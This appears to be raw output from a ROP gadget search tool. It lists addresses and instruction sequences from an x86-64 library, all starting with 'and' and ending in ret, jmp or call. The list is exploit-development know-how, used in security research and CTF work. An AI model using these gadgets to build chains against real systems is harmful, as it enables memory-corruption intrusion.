0x00002aaaaab38e5e : and al, 0x12 ; add byte ptr [rax + 0x63], cl ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaab38e42 : and al, 0x12 ; add byte ptr [rax + 0x63], cl ; adc al, 0x91 ; add rcx, rdx ; jmp rcx
0x00002aaaaaafba19 : and al, 0x14 ; jmp 0x26830
0x00002aaaaaafba18 : and al, 0x14 ; jmp 0x26831
0x00002aaaaaaf5824 : and al, 0x14 ; mov rdx, qword ptr [rax] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaab53c49 : and al, 0x14 ; pop r12 ; ret
0x00002aaaaab03d82 : and al, 0x15 ; add byte ptr [rax + 0x63], cl ; adc al, 0x88 ; add rax, rdx ; jmp rax
0x00002aaaaac6f470 : and al, 0x17 ; cli ; push qword ptr [rcx + rsi + 2] ; add byte ptr [rcx + rbx - 6], dh ; jmp rsp
0x00002aaaaab1805c : and al, 0x18 ; add byte ptr [rcx + 0x39], cl ; ret 0x87e
0x00002aaaaabc4453 : and al, 0x18 ; add dword ptr [rax - 0x75], ecx ; and al, 0x18 ; mov rdx, rax ; jmp 0xef49d
0x00002aaaaab1bdba : and al, 0x18 ; add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xd084
0x00002aaaaab59e0c : and al, 0x18 ; add rsp, 8 ; mov rdi, rbp ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaab586eb : and al, 0x18 ; add rsp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaabb85d0 : and al, 0x18 ; call 0x1f8a4
0x00002aaaaab12fe4 : and al, 0x18 ; call 0x3c0a8
0x00002aaaaac00eda : and al, 0x18 ; call qword ptr [rax]
0x00002aaaaaaf9073 : and al, 0x18 ; call r12
0x00002aaaaaaf582c : and al, 0x18 ; call rax
0x00002aaaaac06b97 : and al, 0x18 ; call rcx
0x00002aaaaab53c12 : and al, 0x18 ; cmp rbx, rax ; je 0x7ec29 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac00c09 : and al, 0x18 ; lea r9, qword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaac0c270 : and al, 0x18 ; lea r9, qword ptr [rsp + 0x3a] ; call qword ptr [rax]
0x00002aaaaab72d4d : and al, 0x18 ; mov dword ptr [rdi - 4], eax ; mov rax, rdi ; ret
0x00002aaaaabf28d5 : and al, 0x18 ; mov edi, dword ptr [rax] ; call 0xf6d0a
0x00002aaaaabf28d4 : and al, 0x18 ; mov edi, dword ptr [rax] ; call 0xf6d0b
0x00002aaaaab56145 : and al, 0x18 ; mov qword ptr [rsp + 0x10], r8 ; call rdi
0x00002aaaaaaf6858 : and al, 0x18 ; mov r9, r14 ; call rbx
0x00002aaaaab9d701 : and al, 0x18 ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaaaf9367 : and al, 0x18 ; mov rax, qword ptr [rsp + 0x28] ; call rax
0x00002aaaaaaf9d02 : and al, 0x18 ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaab81ab7 : and al, 0x18 ; mov rcx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaab0d381 : and al, 0x18 ; mov rdi, r12 ; call r15
0x00002aaaaab4a0c2 : and al, 0x18 ; mov rdi, r12 ; call rbx
0x00002aaaaab81d67 : and al, 0x18 ; mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaab817ff : and al, 0x18 ; mov rdx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaabc4459 : and al, 0x18 ; mov rdx, rax ; jmp 0xef497
0x00002aaaaabc4458 : and al, 0x18 ; mov rdx, rax ; jmp 0xef498
0x00002aaaaac0b11c : and al, 0x1c ; call qword ptr [r10]
0x00002aaaaac00de8 : and al, 0x1c ; call qword ptr [rax]
0x00002aaaaac17bb5 : and al, 0x1f ; add byte ptr [rbp + 0x16], dh ; add rsp, 0x38 ; ret
0x00002aaaaabba0d7 : and al, 0x20 ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab545e5 : and al, 0x20 ; add al, ch ; ret
0x00002aaaaaad5975 : and al, 0x20 ; add byte ptr [rax], al ; ret
0x00002aaaaabb7a56 : and al, 0x20 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab55d11 : and al, 0x20 ; call qword ptr [rax]
0x00002aaaaaafdabc : and al, 0x20 ; call r14
0x00002aaaaaaf8e53 : and al, 0x20 ; call r15
0x00002aaaaab5608d : and al, 0x20 ; call rax
0x00002aaaaab814cb : and al, 0x20 ; call rbx
0x00002aaaaac0699f : and al, 0x20 ; call rcx
0x00002aaaaab8112b : and al, 0x20 ; lea rcx, qword ptr [rax + 4] ; call rbx
0x00002aaaaac003ba : and al, 0x20 ; mov qword ptr [rsp + 0x28], r9 ; call 0x137649
0x00002aaaaac003b9 : and al, 0x20 ; mov qword ptr [rsp + 0x28], r9 ; call 0x13764a
0x00002aaaaaafa110 : and al, 0x20 ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaab0dfe4 : and al, 0x20 ; mov rax, qword ptr [rsp + 0x30] ; lea r15, qword ptr [rbx + r14] ; call rax
0x00002aaaaaaf906e : and al, 0x20 ; mov rdi, qword ptr [rsp + 0x18] ; call r12
0x00002aaaaab8eb3f : and al, 0x20 ; mov rsi, r14 ; mov rdi, r12 ; call rbx
0x00002aaaaac6f4f8 : and al, 0x22 ; cli ; call rsp
0x00002aaaaac6d788 : and al, 0x24 ; idiv bh ; mov esp, 0x5400017b ; and al, 0xf6 ; call rsp
0x00002aaaaab53c43 : and al, 0x24 ; pop rbp ; mov dword ptr [r12 + 0x14], eax ; pop r12 ; ret
0x00002aaaaac58384 : and al, 0x26 ; outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x00002aaaaabbba21 : and al, 0x28 ; add al, byte ptr [rax] ; add byte ptr [rbx - 0x76f72cac], cl ; push rsp ; ret
0x00002aaaaab11e68 : and al, 0x28 ; add byte ptr [rcx + 0x39], cl ; ret 0x87e
0x00002aaaaac003bf : and al, 0x28 ; call 0x137644
0x00002aaaaac003be : and al, 0x28 ; call 0x137645
0x00002aaaaab085db : and al, 0x28 ; call 0x1f8a4
0x00002aaaaab085da : and al, 0x28 ; call 0x1f8a5
0x00002aaaaaaf936c : and al, 0x28 ; call rax
0x00002aaaaab81000 : and al, 0x28 ; lea rcx, qword ptr [rax + 1] ; call rbx
0x00002aaaaab56088 : and al, 0x28 ; mov qword ptr [rsp + 0x20], r10 ; call rax
0x00002aaaaaafdab7 : and al, 0x28 ; mov rdi, qword ptr [rsp + 0x20] ; call r14
0x00002aaaaaaf8e4e : and al, 0x28 ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaab55d09 : and al, 0x28 ; mov rdi, r15 ; mov qword ptr [rsp + 0x20], r10 ; call qword ptr [rax]
0x00002aaaaab59403 : and al, 0x28 ; mov rdi, rbp ; call rax
0x00002aaaaac06997 : and al, 0x28 ; mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaac0c4b4 : and al, 0x2a ; call qword ptr [rax]
0x00002aaaaac00c0e : and al, 0x2c ; call qword ptr [rax]
0x00002aaaaac82e5c : and al, 0x2f ; add dword ptr [rax], eax ; jo 0x1ade48 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabc8508 : and al, 0x2f ; mov qword ptr [rsp + 0x40], rax ; call 0x1f7f9
0x00002aaaaab1515f : and al, 0x30 ; add byte ptr [rcx + 0x39], cl ; ret 0x87e
0x00002aaaaac0137d : and al, 0x30 ; call qword ptr [rax]
0x00002aaaaaaf9807 : and al, 0x30 ; call r12
0x00002aaaaaafa592 : and al, 0x30 ; call r14
0x00002aaaaaafa352 : and al, 0x30 ; call r15
0x00002aaaaaaf9d07 : and al, 0x30 ; call rax
0x00002aaaaaaf98bb : and al, 0x30 ; call rbx
0x00002aaaaab0dfe9 : and al, 0x30 ; lea r15, qword ptr [rbx + r14] ; call rax
0x00002aaaaac106f9 : and al, 0x30 ; mov qword ptr [rsp + 8], rax ; xor eax, eax ; call rdx
0x00002aaaaab8f46e : and al, 0x30 ; mov rdi, qword ptr [rax] ; call r14
0x00002aaaaab819ac : and al, 0x30 ; mov rdi, rbp ; call rbx
0x00002aaaaac09fc7 : and al, 0x30 ; mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaab9cf58 : and al, 0x30 ; mov rdi, rbx ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaab6aff5 : and al, 0x31 ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab329df : and al, 0x31 ; rol byte ptr [rbp - 0x3f60f025], 0x29 ; ret
0x00002aaaaaba96c1 : and al, 0x31 ; ror byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac17b2b : and al, 0x38 ; add rax, qword ptr [rdx + 8] ; add rsp, 0x48 ; ret
0x00002aaaaaafd2b1 : and al, 0x38 ; call r14
0x00002aaaaaafab5a : and al, 0x38 ; call r15
0x00002aaaaaafd04a : and al, 0x38 ; call rbx
0x00002aaaaabe6fa7 : and al, 0x38 ; jmp 0x111f71
0x00002aaaaabe6fa6 : and al, 0x38 ; jmp 0x111f72
0x00002aaaaac17a99 : and al, 0x38 ; jne 0x142a80 ; add rsp, 0x48 ; ret
0x00002aaaaac17a98 : and al, 0x38 ; jne 0x142a81 ; add rsp, 0x48 ; ret
0x00002aaaaabd2165 : and al, 0x38 ; mov eax, edx ; add rsp, 0x48 ; ret
0x00002aaaaab085d6 : and al, 0x38 ; mov qword ptr [rsp + 0x28], rcx ; call 0x1f8a9
0x00002aaaaaafaf31 : and al, 0x38 ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaaaf9802 : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r12
0x00002aaaaaafa58d : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r14
0x00002aaaaaafa34d : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r15
0x00002aaaaaaf98b6 : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00002aaaaabd6ad4 : and al, 0x39 ; ret
0x00002aaaaab73096 : and al, 0x39 ; ret 0x2574
0x00002aaaaac0c275 : and al, 0x3a ; call qword ptr [rax]
0x00002aaaaac83d5c : and al, 0x3e ; add dword ptr [rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabb60ba : and al, 0x40 ; add rax, rdx ; jmp rax
0x00002aaaaabc850d : and al, 0x40 ; call 0x1f7f4
0x00002aaaaabc850c : and al, 0x40 ; call 0x1f7f5
0x00002aaaaaafb86a : and al, 0x40 ; call rbx
0x00002aaaaaafbcaa : and al, 0x40 ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaabfbec1 : and al, 0x40 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaafd2ac : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00002aaaaaafab55 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00002aaaaaafd045 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaac06b8f : and al, 0x40 ; mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaabfe925 : and al, 0x41 ; call rsp
0x00002aaaaabd09a6 : and al, 0x44 ; mov eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac6cec0 : and al, 0x46 ; ljmp ptr [rcx + rax*2 + 0x46e40001] ; jmp rsp
0x00002aaaaabd183b : and al, 0x48 ; add esp, 0x18 ; mov eax, edx ; ret
0x00002aaaaaba06c2 : and al, 0x48 ; add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabcad5e : and al, 0x48 ; add esp, 0x18 ; ret
0x00002aaaaab441b2 : and al, 0x48 ; add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabde7b5 : and al, 0x48 ; add esp, 0x38 ; ret
0x00002aaaaabde816 : and al, 0x48 ; add esp, 0x40 ; ret
0x00002aaaaab58a33 : and al, 0x48 ; call rax
0x00002aaaaac1792d : and al, 0x48 ; mov eax, dword ptr [rax + 0x128] ; jmp rax
0x00002aaaaab80ac4 : and al, 0x48 ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac4826e : and al, 0x48 ; mov edx, dword ptr [rdx + rbp*8] ; test rdx, rdx ; je 0x173284 ; call rdx
0x00002aaaaac03813 : and al, 0x48 ; mov edx, ebx ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaabc85ce : and al, 0x48 ; mov qword ptr [r14], rbx ; call 0x1f8af
0x00002aaaaaafb865 : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00002aaaaab901fd : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x68] ; call r12
0x00002aaaaab6af3c : and al, 0x48 ; test esi, esi ; jne 0x95f53 ; jmp 0x95f0d
0x00002aaaaac74e5c : and al, 0x4f ; add byte ptr [rax], al ; nop ; pop rsp ; jmp 0x19fe6a
0x00002aaaaac6b6f8 : and al, 0x50 ; jmp 0x1966fe
0x00002aaaaac6cbd8 : and al, 0x51 ; lcall ptr [rsp + rbp + 0x52140001] ; call rsp
0x00002aaaaac6ef10 : and al, 0x52 ; stc ; call rsp
0x00002aaaaac6f710 : and al, 0x56 ; cli ; jmp rsp
0x00002aaaaac6b8d8 : and al, 0x5c ; in eax, dx ; lcall ptr [rdx + rbp*4 + 0x5d740000] ; in eax, dx ; jmp rsp
0x00002aaaaab53c44 : and al, 0x5d ; mov dword ptr [r12 + 0x14], eax ; pop r12 ; ret
0x00002aaaaac0194b : and al, 0x60 ; call rax
0x00002aaaaac69ce4 : and al, 0x60 ; cld ; push qword ptr [rdi + rbx*2 + 0x5f44fffc] ; cld ; call rsp
0x00002aaaaac5e204 : and al, 0x63 ; cmc ; call qword ptr [rbx]
0x00002aaaaac5e2d8 : and al, 0x63 ; cmc ; call rsi
0x00002aaaaac5e2e8 : and al, 0x63 ; cmc ; push rbx ; cmc ; call qword ptr [rbx]
0x00002aaaaabce7e7 : and al, 0x68 ; add ecx, dword ptr [rcx + 0xf30244c] ; xchg eax, esp ; ret 0x8445
0x00002aaaaab90202 : and al, 0x68 ; call r12
0x00002aaaaab58d3b : and al, 0x68 ; call rax
0x00002aaaaab5a0cb : and al, 0x68 ; mov rsi, r13 ; mov rdi, rbx ; call rax
0x00002aaaaac42968 : and al, 0x6a ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac6c120 : and al, 0x6e ; out dx, al ; call rsp
0x00002aaaaac17e3d : and al, 0x70 ; add al, 0 ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaab81c6d : and al, 0x70 ; mov rdi, r12 ; call rbx
0x00002aaaaab816e3 : and al, 0x70 ; mov rdi, rbp ; call rbx
0x00002aaaaac8705c : and al, 0x71 ; add dword ptr [rax], eax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaab9613b : and al, 0x71 ; jmp 0xbf36f
0x00002aaaaab9613a : and al, 0x71 ; jmp 0xbf370
0x00002aaaaabe0de4 : and al, 0x74 ; adc dword ptr [rcx], esi ; rcr byte ptr [rbx - 0x77], cl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaabc86ab : and al, 0x74 ; add al, ch ; std ; outsd dx, dword ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabca10d : and al, 0x74 ; xor byte ptr [rax + 0x63], cl ; ret 0xc283
0x00002aaaaabb4d99 : and al, 0x78 ; call 0x1f8b2
0x00002aaaaab84ff0 : and al, 0x78 ; jmp 0xafadf
0x00002aaaaab84fef : and al, 0x78 ; jmp 0xafae0
0x00002aaaaac77c5c : and al, 0x7d ; add byte ptr [rax], al ; nop ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaab13a8c : and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaafeabc : and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx + rcx*2], 0x39 ; ret
0x00002aaaaab8a062 : and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaabb356f : and al, 0x83 ; ret 0x4801
0x00002aaaaabf6f14 : and al, 0x83 ; rol byte ptr [rbx], 0x25 ; cld ; inc dword ptr [rcx] ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaac5cb6c : and al, 0x84 ; call qword ptr [rsi]
0x00002aaaaabc7824 : and al, 0x88 ; add byte ptr [rax], al ; add al, ch ; ret 0xf2cf
0x00002aaaaab8ac13 : and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab8b3bb : and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaab568d6 : and al, 0x89 ; ret 0xb48b
0x00002aaaaabc637f : and al, 0x89 ; ret 0xe883
0x00002aaaaaafac53 : and al, 0x90 ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x4a ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaaaf8ff2 : and al, 0x90 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x00002aaaaabb4be3 : and al, 0x94 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8f0f
0x00002aaaaac7965c : and al, 0x97 ; add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaaafea6d : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00002aaaaab89bc4 : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rcx + 0x29], al ; ret 0x8341
0x00002aaaaabaf4f9 : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x947c
0x00002aaaaac79a5c : and al, 0x9b ; add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaabaf651 : and al, 0xa0 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x7cb7fead], cl ; ret
0x00002aaaaabaf660 : and al, 0xa0 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaabb4b4b : and al, 0xa4 ; add byte ptr [rax], al ; add byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaabaf7bc : and al, 0xa8 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaabcba95 : and al, 0xa8 ; add cl, byte ptr [rdi] ; ret 0xfc3
0x00002aaaaabd2262 : and al, 0xb0 ; ret
0x00002aaaaac03f57 : and al, 0xb8 ; add byte ptr [rax], al ; add byte ptr [rcx + 0x39], cl ; ret 0x850f
0x00002aaaaab62a98 : and al, 0xba ; add dword ptr [rax], eax ; cmove rax, rdx ; ret
0x00002aaaaaba0531 : and al, 0xc ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0a83b : and al, 0xc ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab0fb4d : and al, 0xc ; add rsp, 0x18 ; ret
0x00002aaaaab9da72 : and al, 0xc ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac17be0 : and al, 0xc ; add rsp, 0x38 ; ret
0x00002aaaaab0abe8 : and al, 0xc ; add rsp, 0x90 ; pop rbx ; ret
0x00002aaaaab3fa55 : and al, 0xc ; call 0xf6d04
0x00002aaaaabcaef7 : and al, 0xc ; call rax
0x00002aaaaac6fa60 : and al, 0xc3 ; cli ; jmp rsp
0x00002aaaaac5d44c : and al, 0xc4 ; call qword ptr [rcx]
0x00002aaaaac5d43c : and al, 0xc4 ; inc dword ptr [rsp + rbx*8 - 0x3bdb000d] ; jmp qword ptr [rdi]
0x00002aaaaac5d444 : and al, 0xc4 ; jmp qword ptr [rdi]
0x00002aaaaaad71d5 : and al, 0xc7 ; jno 0x2226 ; ret 0x1dd4
0x00002aaaaac01375 : and al, 0xc8 ; add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x30 ; call qword ptr [rax]
0x00002aaaaabb4b39 : and al, 0xc8 ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x8488
0x00002aaaaac10c5b : and al, 0xd0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac6f2a0 : and al, 0xd0 ; stc ; lcall ptr [rsp - 0x2efbfffe] ; stc ; call rsp
0x00002aaaaac6bc10 : and al, 0xd4 ; in eax, dx ; jmp rsp
0x00002aaaaab4bc9f : and al, 0xe0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; pop rbp ; sbb al, ch ; ret
0x00002aaaaab46868 : and al, 0xe0 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaabcf961 : and al, 0xe8 ; cdq ; ret
0x00002aaaaab09f9c : and al, 0xe8 ; fld st(0) ; fstp xword ptr [rdi] ; fsubp st(1) ; ret
0x00002aaaaab0a02b : and al, 0xe8 ; fstp xword ptr [rdi] ; ret
0x00002aaaaab0a009 : and al, 0xe8 ; ret
0x00002aaaaab1f218 : and al, 0xec ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaac17a7a : and al, 0xf ; add byte ptr [rbp + 0x29], dh ; xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaac17b42 : and al, 0xf ; add byte ptr [rbp + 9], dh ; xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaab0a027 : and al, 0xf0 ; fld xword ptr [rsp - 0x18] ; fstp xword ptr [rdi] ; ret
0x00002aaaaab0a005 : and al, 0xf0 ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaac5be31 : and al, 0xf0 ; jmp qword ptr [rax - 0x1f000fdb]
0x00002aaaaab0a0c7 : and al, 0xf0 ; mov dword ptr [rdi], esi ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab8fd46 : and al, 0xf0 ; movsd xmm0, qword ptr [rsp - 0x10] ; ret
0x00002aaaaab8fd4c : and al, 0xf0 ; ret
0x00002aaaaac7d721 : and al, 0xf1 ; jmp rcx
0x00002aaaaac7f4a1 : and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac6ce21 : and al, 0xf3 ; jmp rsp
0x00002aaaaac6ce19 : and al, 0xf3 ; push qword ptr [rdx + rdi + 0x24540001] ; jmp rsp
0x00002aaaaaba1eea : and al, 0xf3 ; ret
0x00002aaaaac6d791 : and al, 0xf6 ; call rsp
0x00002aaaaac6e8d9 : and al, 0xf8 ; inc esp ; salc ; add dword ptr [rax], eax ; xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaac6e8e1 : and al, 0xf8 ; jmp rsp
0x00002aaaaab689f6 : and al, 0xf8 ; jne 0x938d2 ; ret
0x00002aaaaab689f5 : and al, 0xf8 ; jne 0x938d3 ; ret
0x00002aaaaab1f1d1 : and al, 0xf8 ; movsd xmm0, qword ptr [rsp - 8] ; ret
0x00002aaaaab1f1d7 : and al, 0xf8 ; ret
0x00002aaaaab0a056 : and al, 0xfc ; fld xword ptr [rsp + 8] ; fscale ; fstp st(1) ; ret
0x00002aaaaab1f18b : and al, 0xfc ; movss xmm0, dword ptr [rsp - 4] ; ret
0x00002aaaaab1f191 : and al, 0xfc ; ret
0x00002aaaaab0a1a7 : and al, 0xfe ; fldcw word ptr [rsp - 2] ; ret
0x00002aaaaab0a1ab : and al, 0xfe ; ret
0x00002aaaaab93636 : and al, 1 ; add byte ptr [rax], al ; add bl, ch ; ret 0x1f0f
0x00002aaaaac6f2a5 : and al, 2 ; add byte ptr [rcx + rdx*8], al ; stc ; call rsp
0x00002aaaaac93410 : and al, 4 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 3
0x00002aaaaabb2794 : and al, 4 ; xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab0c304 : and al, 6 ; mov rbx, rax ; mov rdi, r12 ; call r15
0x00002aaaaab7ab58 : and al, 7 ; add byte ptr [rax], al ; ret
0x00002aaaaac0b269 : and al, 8 ; add byte ptr [rdi], cl ; xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; jo 0x1362da ; ret
0x00002aaaaabee223 : and al, 8 ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8e456 : and al, 8 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab0ffec : and al, 8 ; add rsp, 0x18 ; ret
0x00002aaaaabcfc37 : and al, 8 ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcb5cd : and al, 8 ; add rsp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac02ab7 : and al, 8 ; call qword ptr [rax]
0x00002aaaaab5d672 : and al, 8 ; call qword ptr [rdx]
0x00002aaaaabe31f3 : and al, 8 ; call rax
0x00002aaaaabd7158 : and al, 8 ; call rbx
0x00002aaaaac0192f : and al, 8 ; call rcx
0x00002aaaaab0a05a : and al, 8 ; fscale ; fstp st(1) ; ret
0x00002aaaaac0f8bf : and al, 8 ; lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac0f9f7 : and al, 8 ; lea rsi, qword ptr [rsp + 8] ; mov rdi, r12 ; call qword ptr [rax]
0x00002aaaaaaf4c01 : and al, 8 ; mov eax, dword ptr [rbx + 4] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabde7b0 : and al, 8 ; mov rax, qword ptr [rsp] ; add rsp, 0x38 ; ret
0x00002aaaaabde811 : and al, 8 ; mov rax, qword ptr [rsp] ; add rsp, 0x40 ; ret
0x00002aaaaabd7150 : and al, 8 ; mov rdi, qword ptr [rax] ; mov qword ptr [rsp + 8], rax ; call rbx
0x00002aaaaab42e25 : and al, 8 ; mov rdi, qword ptr [rdi + 0xe0] ; call rax
0x00002aaaaac0f9fc : and al, 8 ; mov rdi, r12 ; call qword ptr [rax]
0x00002aaaaabf436b : and al, 8 ; mov rdi, r13 ; call r12
0x00002aaaaac0efbf : and al, 8 ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaac03920 : and al, 8 ; mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab0df67 : and al, 8 ; mov rsi, qword ptr [r15] ; mov rdi, qword ptr [r13] ; call r14
0x00002aaaaab0cd66 : and al, 8 ; mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaab0e1a6 : and al, 8 ; mov rsi, r15 ; mov rdi, r13 ; call r14
0x00002aaaaab09f3b : and al, 8 ; ret
0x00002aaaaaba07ec : and al, 8 ; test rax, rax ; je 0xcb7fc ; call rax
0x00002aaaaaba07eb : and al, 8 ; test rax, rax ; je 0xcb7fd ; call rax
0x00002aaaaac106fe : and al, 8 ; xor eax, eax ; call rdx
0x00002aaaaac69630 : and al, bl ; sti ; jmp rax
0x00002aaaaab09b1e : and al, byte ptr [rax] ; add byte ptr [rax], al ; add rsp, 0x28 ; ret
0x00002aaaaab0a176 : and al, byte ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac02829 : and al, byte ptr [rax] ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabf7d13 : and al, byte ptr [rbx + 0x2bafff8] ; add dword ptr [rax], eax ; add byte ptr [rdi], cl ; ret 0xf3c3
0x00002aaaaabaf37d : and al, byte ptr [rbx + 0xd7403f8] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac8213d : and al, byte ptr [rcx] ; add al, dh ; xchg eax, ebp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6ca9d : and al, byte ptr [rcx] ; add byte ptr [rdi - 0xf], dl ; jmp rsp
0x00002aaaaabd8eda : and al, byte ptr [rdi + 0x3948fffa] ; ret
0x00002aaaaab5deba : and al, byte ptr [rsp - 0xb7f68c] ; ret 0xc148
0x00002aaaaab02e32 : and ax, 0x100 ; movzx eax, ax ; ret
0x00002aaaaab02e52 : and ax, 0x1000 ; movzx eax, ax ; ret
0x00002aaaaab02d92 : and ax, 0x200 ; movzx eax, ax ; ret
0x00002aaaaab02e12 : and ax, 0x2000 ; movzx eax, ax ; ret
0x00002aaaaab02d32 : and ax, 0x400 ; movzx eax, ax ; ret
0x00002aaaaab02dd2 : and ax, 0x4000 ; movzx eax, ax ; ret
0x00002aaaaab02d72 : and ax, 0x800 ; movzx eax, ax ; ret
0x00002aaaaab02db2 : and ax, 0x8000 ; movzx eax, ax ; ret
0x00002aaaaac69b09 : and bh, ah ; call qword ptr [rax]
0x00002aaaaab2b83e : and bh, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x00002aaaaaad7f98 : and bh, byte ptr [rax - 0x52] ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
